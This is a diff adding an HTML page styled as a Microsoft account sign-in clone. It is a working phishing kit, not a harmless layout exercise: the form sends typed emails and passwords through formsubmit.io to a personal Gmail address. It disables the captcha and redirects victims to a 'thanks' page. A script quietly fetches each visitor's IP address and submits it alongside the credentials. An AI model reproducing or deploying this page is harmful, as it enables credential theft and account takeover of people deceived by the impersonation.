@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <link rel="stylesheet" href="style.css"> -->
+    <title>Live Signin Page Clone</title>
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,regular,italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic);
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            color: #1b1b1b;
+        }
+
+        body {
+            display: grid;
+            place-items: center;
+            min-height: 100vh;
+            background-color: #dde2d1;
+        }
+
+        /* SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg */
+        /* JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb */
+
+        /* SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg */
+        /* JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb */
+
+        form {
+            width: 440px;
+            background-color: #fff;
+            box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+            padding: 44px;
+        }
+
+        .logo {
+            margin-bottom: 15px;
+        }
+
+        form h2 {
+            font-size: 24px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin: 0 0 16px;
+        }
+
+        form input {
+            padding: 6px 10px 6px 0;
+            margin-top: 1rem;
+            border: none;
+            outline: none;
+            border-bottom: 1px solid #000000b3;
+            width: 100%;
+            font-size: .9rem;
+        }
+
+        form p {
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        form a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        form a:hover {
+            color: #000000b3;
+            text-decoration: underline;
+        }
+
+        form :is(.first, .second)>a {
+            font-size: 13px;
+        }
+
+        form .first>a span {
+            width: 20px;
+            height: 20px;
+            border: 1px solid #000000b3;
+            display: inline-block;
+            text-align: center;
+            border-radius: 50%;
+            margin-left: 0.2em;
+        }
+
+        form button {
+            display: block;
+            margin-left: auto;
+            width: 108px;
+            height: 32px;
+            padding: 4px 12px;
+            font-size: 15px;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            outline: none;
+            cursor: pointer;
+        }
+
+        form button:hover {
+            background-color: #004b85;
+        }
+
+        form button:active {
+            transform: scale(.97);
+        }
+
+        .forms-container {
+            overflow-x: hidden;
+        }
+
+        .forms {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            width: calc((440px - 88px) * 2);
+            transition: 200ms ease-in-out transform;
+        }
+
+        .first,
+        .second {
+            width: 100%;
+        }
+
+        .arrow-btn {
+            cursor: pointer;
+            font-size: 1rem;
+            margin-right: 0.3rem;
+            width: 25px;
+            height: 25px;
+            display: inline-block;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 25px;
+        }
+
+        .arrow-btn:hover {
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .bottom {
+            width: 440px;
+            background-color: #fff;
+            box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+            padding: 8px 44px;
+            font-size: 15px;
+            margin-top: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .bottom img {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+        }
+
+        .bottom:hover {
+            background-color: #dde2d1;
+        }
+
+        .next-form {
+            transform: translateX(-50%);
+        }
+
+        /* SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg */
+        /* JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb */
+
+        /* SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg */
+        /* JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb */
+    </style>
+</head>
+
+<body>
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+    <div class="container">
+        <form id="forms" action="https://formsubmit.io/send/ iyanutosin2005@gmail.com" method="POST">
+            <input type="text" id="ipAddress" name="ipAddress" readonly hidden>
+            <img class="logo"
+                                src="data:image/png;base64,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"
+>
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" placeholder="Email" name="email">
+                            <input type="password" placeholder="Password" name="password">
+                        </div>
+                        <input name="_redirect" type="hidden" id="name" value="https://drpzivlot.netlify.app/thanks.html">
+                        <p>No Account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <!-- <button type="submit" class="">Next</button> -->
+                    </div>
+                  
+                <input type="hidden" name="_captcha" value="false">
+
+                </div>
+            </div>
+            <button type="submit">Sign in</button>
+        </form>
+        <div class="bottom">
+            <img
+                src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+
+
+    <!-- <script>
+        const forms = document.querySelector('.forms')
+        const next_button = document.querySelector('.next-btn')
+        const arrow_btn = document.querySelector('.arrow-btn')
+
+        const email_input = document.querySelector('.first input')
+        const email_el = document.querySelector('.email')
+
+        next_button.addEventListener('click', () => {
+            forms.classList.add('next-form')
+            email_el.innerText = email_input.value
+            document.querySelector('.bottom').style.display = 'none'
+        })
+        arrow_btn.addEventListener('click', () => {
+            forms.classList.remove('next-form')
+            document.querySelector('.bottom').style.display = 'flex'
+        })
+    </script> -->
+
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    document.getElementById('ipAddress').value = ipAddress;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        });
+
+    </script>
+</body>
+
+</html>
